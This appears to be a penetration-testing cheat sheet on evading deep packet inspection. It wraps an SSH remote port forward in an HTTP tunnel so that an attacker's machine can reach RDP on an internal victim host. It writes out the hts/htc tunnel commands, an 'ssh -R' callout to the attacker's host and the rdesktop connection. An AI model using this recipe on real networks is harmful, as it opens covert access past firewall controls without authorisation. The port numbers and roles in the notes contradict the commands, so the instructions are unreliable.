Traffic Encapsulation

Info: 

When a deep packet inspection occurs on the network that do not allow any protocol out of the specified open ports in a firewall, an ecapsulation tool is required. 

For a deep packet inspection that only allows HTTP out of the network: An HTTP encaspulation tool such as http_tunnel can be used. 
For a deep packet inspection that only allows HTTPS out of the network: An SSL encapsulation tool such as stunnel can be used. 


HTTP Encapsulation of SSH Remote Port Forwarding

Info: Tunnel a remote port to a local server using SSH and encapsulate the traffic using HTTP

Program: http_tunnel and SSH 

Set Up:

On Machine B set up the HTTP Tunnel server:

root@kali:~# hts -h

root@kali-srv:~# hts -F localhost:22 53

Note: This starts http tunneling server and forwards (-F) incoming connection on port 2139 to localhost:22


On Machine B run the ssh daemon on port 53:

root@kali:~# /etc/ssh/sshd_config

# What ports, IPs and protocols we listen for
Port 22

root@kali:~# /etc/init.d/ssh restart



On Machine A run the HTTP_client command:

root@kali:~# htc -h

root@kali-clt:~# htc -F 80 192.168.1.15:53

Note: Run the http tunnel client and forward (-F) all incoming connection on port 8090 to 192.168.1.15:53


On Machine A run the ssh command:

ssh <gateway> -R <remote port to bind>:<local host>:<local port>

ssh a.b.c.d -R 3390:127.0.0.1:3389 -p 80

Note: 

Gateway = Machine B ip address
-R = Remote Port Forwarding
Remote Port To Bind = The port on Machine B that will be used to connect to Machine A's RDP service
Local host = the local ip address of Machine A
Local port = The port of Machine A to tunnel
-p = Port of Machine B SSH server (configured to go through the HTTP encapsulation)


On Machine B run

root@kali:~# rdesktop 127.0.0.1:3390


Usage

Situation: Machine A is an internal non-routeable machine in a corporate network with a Window's RDP service on port 3389. 

Victim's machine Attacker's Machine 

Machine A <----------------> Machine B

Machine A <-------------------> a.b.c.d 


Machine B sets up HTTP tunnel server on port 53 that will forward all packets onto the SSH daemon on port 22
Machine B sets up SSH daemon on port 22
Machine A sets up HTTP tunnel client on port 80 that will forward all packets to machine B on port 53
Machine A SSH connects to Machine B using port 80 (HTTP client tunnel port) which forwards the traffic onto the http tunnel server on Machine A which forward the packets onto the ssh server, which, using the remote port fowarding method, sets the gateway as Machine B, the remote port to bind as 3890, the local host as 127.0.0.1, and the local port to 3389  (RDP)
Machine B RDP's to 127.0.0.1:3390 sending the traffic through the HTTP Tunnel, then through the SSH tunnel, then back out the HTTP Tunnel to Machine A, which sends the traffic to it's RDP service on port 3389. 

